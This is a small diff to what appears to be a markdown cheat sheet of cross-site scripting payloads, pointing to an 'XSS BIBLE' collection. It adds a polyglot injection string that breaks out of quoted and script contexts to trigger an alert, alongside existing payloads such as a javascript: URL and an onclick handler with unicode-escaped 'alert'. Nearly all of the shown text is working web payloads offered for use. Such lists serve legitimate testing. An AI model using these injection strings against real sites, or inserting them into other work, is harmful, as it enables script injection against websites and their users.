@@ -8,7 +8,10 @@ XSS BIBLE---> https://github.com/s0md3v/AwesomeXSS
 javascript:alert(1)
 ```
 ### 
-
+```
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+```
+###
 ```
 <h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>
 ```
